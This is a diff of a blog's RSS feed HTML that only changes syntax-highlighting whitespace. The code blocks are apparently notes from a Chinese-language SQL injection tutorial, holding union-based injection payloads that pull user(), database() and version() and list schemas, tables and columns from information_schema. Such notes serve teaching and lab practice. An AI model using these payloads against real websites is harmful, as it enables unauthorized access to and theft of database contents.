@@ -142,8 +142,8 @@ mysql&gt; <span class="k">select</span> concat<span class="o">(</span><span clas
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">group_concat</span><span class="p">([</span><span class="k">DISTINCT</span><span class="p">]</span> <span class="err">要连接的字段</span> <span class="p">[</span><span class="k">Order</span> <span class="k">BY</span> <span class="k">ASC</span><span class="o">/</span><span class="k">DESC</span> <span class="err">排序字段</span><span class="p">]</span> <span class="p">[</span><span class="n">Separator</span> <span class="err">‘分隔符’</span><span class="p">])</span>
-</code></pre></td></tr></table>
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">group_concat</span><span class="p">([</span><span class="k">DISTINCT</span><span class="p">]</span><span class="w"> </span><span class="err">要连接的字段</span><span class="w"> </span><span class="p">[</span><span class="k">Order</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="k">ASC</span><span class="o">/</span><span class="k">DESC</span><span class="w"> </span><span class="err">排序字段</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">Separator</span><span class="w"> </span><span class="err">‘分隔符’</span><span class="p">])</span><span class="w">
+</span></code></pre></td></tr></table>
 </div>
 </div><h4 id="基本查询">基本查询</h4>
 <div class="highlight"><div class="chroma">
@@ -265,8 +265,8 @@ mysql&gt; <span class="k">select</span> concat<span class="o">(</span><span clas
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,(</span><span class="n">concat_ws</span><span class="p">(</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">32</span><span class="p">),</span><span class="k">user</span><span class="p">(),</span><span class="k">database</span><span class="p">(),</span><span class="k">version</span><span class="p">()))</span> <span class="o">%</span><span class="mi">23</span>
-</code></pre></td></tr></table>
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,(</span><span class="n">concat_ws</span><span class="p">(</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">32</span><span class="p">),</span><span class="k">user</span><span class="p">(),</span><span class="k">database</span><span class="p">(),</span><span class="k">version</span><span class="p">()))</span><span class="w"> </span><span class="o">%</span><span class="mi">23</span><span class="w">
+</span></code></pre></td></tr></table>
 </div>
 </div><p>查询所有数据库名</p>
 <div class="highlight"><div class="chroma">
@@ -274,8 +274,8 @@ mysql&gt; <span class="k">select</span> concat<span class="o">(</span><span clas
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="k">schema_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span>
-</code></pre></td></tr></table>
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="k">schema_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="w">
+</span></code></pre></td></tr></table>
 </div>
 </div><p>查询一个库中所有的表的名字</p>
 <div class="highlight"><div class="chroma">
@@ -283,8 +283,8 @@ mysql&gt; <span class="k">select</span> concat<span class="o">(</span><span clas
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">union</span> <span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">),</span><span class="k">table_name</span><span class="p">,</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span>   <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="mi">0</span><span class="n">x7365637572697479</span>  <span class="o">%</span><span class="mi">23</span>
-</code></pre></td></tr></table>
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">),</span><span class="k">table_name</span><span class="p">,</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w">   </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="mi">0</span><span class="n">x7365637572697479</span><span class="w">  </span><span class="o">%</span><span class="mi">23</span><span class="w">
+</span></code></pre></td></tr></table>
 </div>
 </div><p>注意。在系统自带的表中查东西，where后面的值应该是单引号包裹或者16进制编码，通常用16进制</p>
 <div class="highlight"><div class="chroma">
@@ -292,8 +292,8 @@ mysql&gt; <span class="k">select</span> concat<span class="o">(</span><span clas
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;my_db&#39;</span>
-</code></pre></td></tr></table>
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;my_db&#39;</span><span class="w">
+</span></code></pre></td></tr></table>
 </div>
 </div><p>查询一个表中所有列的名字</p>
 <div class="highlight"><div class="chroma">
@@ -303,9 +303,9 @@ mysql&gt; <span class="k">select</span> concat<span class="o">(</span><span clas
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">union</span> <span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">),</span><span class="k">table_name</span><span class="p">,</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">COLUMNS</span>   <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="mi">0</span><span class="n">x7365637572697479</span>  <span class="o">%</span><span class="mi">23</span>
-
-<span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="k">column_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;my_db&#39;</span>
-</code></pre></td></tr></table>
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">),</span><span class="k">table_name</span><span class="p">,</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">COLUMNS</span><span class="w">   </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="mi">0</span><span class="n">x7365637572697479</span><span class="w">  </span><span class="o">%</span><span class="mi">23</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="k">column_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;my_db&#39;</span><span class="w">
+</span></code></pre></td></tr></table>
 </div>
 </div>]]></description></item></channel></rss>
